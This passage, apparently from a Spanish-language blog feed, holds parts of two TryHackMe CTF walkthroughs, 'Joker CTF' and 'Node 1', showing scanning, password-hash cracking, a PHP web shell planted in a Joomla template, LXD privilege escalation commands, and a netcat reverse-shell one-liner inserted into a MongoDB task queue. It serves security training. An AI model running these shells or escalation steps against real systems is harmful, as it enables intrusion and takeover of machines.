  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2020-02-27 16:01:01

GET	&lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden			http://jokerctf.thm:8080/.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://jokerctf.thm:8080/.php
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/administrator
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/administrator/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/backup
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/backup.zip
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/bin
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/bin/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/cache
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/cache/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/components
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/components/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/configuration.php
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/images
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/images/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/includes
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/includes/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/index.php
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/index.php
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/language
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/language/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/layouts
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/layouts/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/libraries
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/libraries/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/LICENSE
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/LICENSE.txt
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/media
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/media/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/modules
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/modules/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/plugins
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/plugins/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/README
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/README.txt
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/robots
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/robots.txt
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/robots.txt
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://jokerctf.thm:8080/server-status
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/templates
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/templates/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://jokerctf.thm:8080/tmp
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://jokerctf.thm/tmp/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/web.config
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://jokerctf.thm:8080/web.config.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ended at: 2020-02-27 16:05:02
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---www-data&#34;&gt;USER - www-data&lt;/h2&gt;
&lt;p&gt;Encontramos un archivo &lt;code&gt;backup.zip&lt;/code&gt; en la pagina protegido por contraseña, utilizamos la contraseña de joker que encontramos con hydra.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/jokerctf# file backup.zip 
backup.zip: Zip archive data, at least v1.0 to extract
root@aoiri:~/tryhackme/jokerctf# unzip backup.zip 
Archive:  backup.zip
   creating: db/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;backup.zip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; db/joomladb.sql password: 
   skipping: db/joomladb.sql         incorrect password
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un archivo de base de datos, dentro de los querys encontramos un insert en el que aparece la contraseña del usuario admin:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_161321.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Crackeamos la contraseña con john:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/jokerctf# john hash_joomla --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bcrypt &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Blowfish 32/64 X3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
******         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:12 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2020-02-27 16:14&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.08130g/s 83.41p/s 83.41c/s 83.41C/s bullshit..bulldogs
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
root@aoiri:~/tryhackme/jokerctf# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ahora podemos iniciar sesion en el panel de joomla, vamos a crear un archivo el cual ejecute comandos en el sistema. Nos dirigimos a &lt;code&gt;Extensions -&amp;gt; Templates, Seleccionamos protostar&lt;/code&gt; el cual esta siendo utilizado en la pagina de joomla.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_162039.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos un archivo en el template protostar.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_162138.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos comandos utilizando la URL &lt;code&gt;http://jokerctf.thm:8080/templates/protostar/shell.php?cmd=id&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_162259.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell utilizando nuestra shell, creamos un archivo &lt;code&gt;shell.sh&lt;/code&gt; el cual contiene una shell inversa, la descargamos en la maquina y la ejecutamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_162843.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Vemos que el usuario www-data pertenece al grupo &lt;code&gt;lxc&lt;/code&gt;, logramos listar las &lt;code&gt;images&lt;/code&gt; que estan disponibles en la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_174345.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos lxc para poder crear un contenedor y montar la carpeta &lt;code&gt;/root&lt;/code&gt; en &lt;code&gt;/mnt/root&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/saghul/lxd-alpine-builder&#34;&gt;&lt;strong&gt;LXD Alpine Builder&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/lxd-privilege-escalation/&#34;&gt;&lt;strong&gt;LXD - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Descargamos alpine en la maquina en la carpeta /tmp&lt;/span&gt;
lxc image import ./alpine-v3.11-x86_64-20200227_1750.tar.gz --alias myimage
lxc image list

lxc init myimage ignite -c security.privileged&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
lxc config device add ignite mydevice disk &lt;span class=&#34;nv&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/ &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&#34;nv&#34;&gt;recursive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
lxc start ignite
lxc &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; ignite /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_175259.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell cn el usuario root y nuestra flag &lt;strong&gt;&amp;ldquo;root.txt&amp;rdquo;&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_175809.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/jokerctf/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/jokerctf/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Node 1</title>
        <link>https://sckull.github.io/posts/nodeone/</link>
        <pubDate>Wed, 26 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 26 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/nodeone/</guid>
        <description>Node 1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Node 1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Node 1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Node is a medium level boot2root challenge, originally created for HackTheBox.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;617&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/coderj&#34;&gt;coderj&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.27.51&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.27.51
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Feb 26 23:43:56 2020 -- 1 IP address (1 host up) scanned in 378.90 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-3000&#34;&gt;HTTP - Puerto 3000&lt;/h2&gt;
&lt;p&gt;En el puerto 3000 encontramos una pagina que nos muestra tres usuarios.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011030.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al analizar el codigo fuente de la pagina nos encontramos con los controladores de la pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011127.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el controlador de &lt;code&gt;home.js&lt;/code&gt; encontramos una ruta de una api a la que hace una solicitud.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011251.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos una consulta a la ruta y nos devuelve tres usuarios, contraseñas encriptadas y que los usuarios no son administradores:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011348.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos crackstation.net para crackear las contraseñas, solo obtuvimos la contraseña de los primeros dos usuarios:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011456.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el controlador &lt;code&gt;profile.js&lt;/code&gt; encontramos que existe otra ruta en la que se hacen consultas de un usuario especifico pero al hacer una consulta sin un usuario nos muestra nuevamente la lista de usuarios con su contraseña, pero en esta respuesta nos aparece un usuario nuevo el cual es administrador:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hash crackeada:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011948.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales del usuario nuevo y nos redirige a una pagina nueva en la que podemos descargar un archivo:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_012033.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El archivo contiene una cadena codificada en base64, al decodificarla vemos que es un archivo zip, pero este esta protegido por contraseña:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_012752.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos fcrackzip para hacer un ataque de fuerza bruta:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_013046.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---mark&#34;&gt;USER - mark&lt;/h2&gt;
&lt;p&gt;Al descomprimir el archivo zip encontramos que, es un backup de la ruta donde se encuentran los archivos de la pagina (&lt;code&gt;/var/html/myplace/&lt;/code&gt;). Vemos la contraseña de la conexion de mongodb con el usuario mark, utilizamos estas credenciales para iniciar sesion en el servicio SSH.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_013459.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con el usuario mark.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_013559.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---tom&#34;&gt;USER - tom&lt;/h2&gt;
&lt;p&gt;En la carpeta &lt;code&gt;/var/scheduler&lt;/code&gt; encontramos una aplicacion la cual contiene una base de datos distinta, y la cual se ejecuta cada 30 segundos, ademas de eso vemos entre los procesos en ejecucion que esta aplicacion la esta ejecutando el usuario tom. La aplicacion realiza una iteracion en la tabla tasks y la ejecuta, luego la elimina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_015512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Insertamos una shell inversa en la tabla tasks (coleccion):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;db.tasks.insert&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 1338 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_020646.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
